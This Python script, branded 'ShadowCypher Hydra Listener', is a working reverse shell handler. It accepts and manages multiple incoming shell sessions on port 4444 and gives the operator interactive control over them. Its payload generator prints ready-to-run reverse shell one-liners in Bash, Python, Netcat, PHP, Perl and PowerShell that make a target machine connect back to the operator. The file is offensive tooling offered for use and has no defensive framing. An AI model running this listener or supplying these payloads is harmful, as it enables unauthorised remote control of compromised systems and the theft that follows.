#!/usr/bin/env python3
"""
SHADOWCYPHER // HYDRA LISTENER — Multi-Session Reverse Shell Handler
Listens for incoming reverse shells, manages multiple concurrent sessions,
and provides interactive shell access with file transfer capabilities.

Usage:
    python3 hydra_listener.py [-p PORT] [--bind ADDR]
"""

import argparse
import socket
import threading
import sys
import os
import time
import select
import struct

C = {"R":"\033[1;31m","G":"\033[1;32m","Y":"\033[1;33m","C":"\033[1;36m","M":"\033[1;35m","N":"\033[0m","B":"\033[1m"}

class Session:
    def __init__(self, conn, addr, sid):
        self.conn = conn
        self.addr = addr
        self.sid = sid
        self.alive = True
        self.info = f"{addr[0]}:{addr[1]}"
        self.created = time.strftime("%H:%M:%S")

class HydraListener:
    def __init__(self, bind_addr="0.0.0.0", port=4444):  # nosec B104
        self.bind_addr = bind_addr
        self.port = port
        self.sessions = {}
        self.next_id = 1
        self.server_socket = None
        self.running = True

    def start_listener(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.bind_addr, self.port))
        self.server_socket.listen(20)
        self.server_socket.settimeout(1.0)
        print(f"  {C['G']}[+]{C['N']} Listener active on {C['Y']}{self.bind_addr}:{self.port}{C['N']}")
        print(f"  {C['C']}[*]{C['N']} Waiting for incoming connections...\n")

        accept_thread = threading.Thread(target=self._accept_loop, daemon=True)
        accept_thread.start()

    def _accept_loop(self):
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                sid = self.next_id
                self.next_id += 1
                session = Session(conn, addr, sid)
                self.sessions[sid] = session
                print(f"\n  {C['G']}[+] SESSION {sid} OPENED{C['N']}: {addr[0]}:{addr[1]}")
                print("  shadow> ", end="", flush=True)
            except socket.timeout:
                continue
            except OSError:
                break

    def interact(self, sid):
        if sid not in self.sessions:
            print(f"  {C['R']}[-]{C['N']} Session {sid} not found")
            return
        session = self.sessions[sid]
        if not session.alive:
            print(f"  {C['R']}[-]{C['N']} Session {sid} is dead")
            return

        print(f"  {C['G']}[+]{C['N']} Interacting with session {sid} ({session.info})")
        print(f"  {C['Y']}[*]{C['N']} Type 'bg' to background, 'exit' to kill session\n")

        session.conn.settimeout(0.5)
        try:
            while session.alive:
                # Check for data from remote
                ready, _, _ = select.select([session.conn], [], [], 0.3)
                if ready:
                    try:
                        data = session.conn.recv(4096)
                        if not data:
                            print(f"\n  {C['R']}[-]{C['N']} Session {sid} died")
                            session.alive = False
                            break
                        sys.stdout.write(data.decode("utf-8", errors="replace"))
                        sys.stdout.flush()
                    except socket.timeout:
                        pass
                    except Exception:
                        session.alive = False
                        break

                # Check for user input (non-blocking)
                if select.select([sys.stdin], [], [], 0.1)[0]:
                    cmd = sys.stdin.readline()
                    if cmd.strip() == "bg":
                        print(f"\n  {C['Y']}[*]{C['N']} Session {sid} backgrounded")
                        return
                    if cmd.strip() == "exit":
                        session.conn.close()
                        session.alive = False
                        print(f"\n  {C['R']}[-]{C['N']} Session {sid} killed")
                        return
                    try:
                        session.conn.send(cmd.encode())
                    except Exception:
                        session.alive = False
                        break
        except KeyboardInterrupt:
            print(f"\n  {C['Y']}[*]{C['N']} Session {sid} backgrounded")

    def list_sessions(self):
        if not self.sessions:
            print(f"  {C['Y']}[*]{C['N']} No active sessions")
            return
        print(f"\n  {C['B']}{'ID':<5} {'Address':<25} {'Status':<10} {'Created'}{C['N']}")
        print(f"  {'─'*55}")
        for sid, s in self.sessions.items():
            status = f"{C['G']}ALIVE{C['N']}" if s.alive else f"{C['R']}DEAD{C['N']}"
            print(f"  {sid:<5} {s.info:<25} {status:<20} {s.created}")
        print()

    def kill_session(self, sid):
        if sid in self.sessions:
            try:
                self.sessions[sid].conn.close()
            except Exception:
                pass
            self.sessions[sid].alive = False
            print(f"  {C['R']}[-]{C['N']} Session {sid} killed")
        else:
            print(f"  {C['R']}[-]{C['N']} Session {sid} not found")

    def generate_payloads(self):
        """Print ready-to-use reverse shell one-liners for the current listener."""
        ip = self._get_local_ip()
        port = self.port
        print(f"\n  {C['B']}=== Reverse Shell Payloads (connect to {ip}:{port}) ==={C['N']}\n")

        payloads = {
            "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "Python": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
            "Netcat": f"nc -e /bin/bash {ip} {port}",
            "Netcat (no -e)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f",
            "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash <&3 >&3 2>&3\");'",
            "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'",
            "PowerShell": f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}}\"",
        }

        for name, payload in payloads.items():
            print(f"  {C['C']}[{name}]{C['N']}")
            print(f"  {C['Y']}{payload}{C['N']}\n")

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "0.0.0.0"  # nosec B104

    def command_loop(self):
        HELP = f"""
  {C['B']}Commands:{C['N']}
    sessions / list    — List active sessions
    interact <id>      — Interact with a session
    kill <id>          — Kill a session
    payloads           — Generate reverse shell one-liners
    help               — Show this help
    exit               — Exit listener
"""
        print(HELP)
        while self.running:
            try:
                cmd = input(f"  {C['C']}shadow>{C['N']} ").strip()
                if not cmd:
                    continue

                parts = cmd.split()
                action = parts[0].lower()

                if action in ("sessions", "list"):
                    self.list_sessions()
                elif action == "interact" and len(parts) > 1:
                    self.interact(int(parts[1]))
                elif action == "kill" and len(parts) > 1:
                    self.kill_session(int(parts[1]))
                elif action == "payloads":
                    self.generate_payloads()
                elif action == "help":
                    print(HELP)
                elif action == "exit":
                    self.running = False
                    break
                else:
                    print(f"  {C['R']}[-]{C['N']} Unknown command. Type 'help'")

            except KeyboardInterrupt:
                print(f"\n  {C['Y']}[*]{C['N']} Use 'exit' to quit")
            except Exception as e:
                print(f"  {C['R']}[-]{C['N']} Error: {e}")

        # Cleanup
        for s in self.sessions.values():
            try:
                s.conn.close()
            except Exception:
                pass
        if self.server_socket:
            self.server_socket.close()

def main():
    p = argparse.ArgumentParser(description="ShadowCypher Hydra Listener")
    p.add_argument("-p","--port", type=int, default=4444)
    p.add_argument("--bind", default="0.0.0.0")  # nosec B104
    a = p.parse_args()

    print(f"\n{C['B']}{'='*70}{C['N']}")
    print(f" {C['C']}SHADOWCYPHER // HYDRA LISTENER{C['N']}")
    print(f"{C['B']}{'='*70}{C['N']}\n")

    listener = HydraListener(a.bind, a.port)
    listener.start_listener()
    listener.command_loop()

if __name__ == "__main__":
    main()
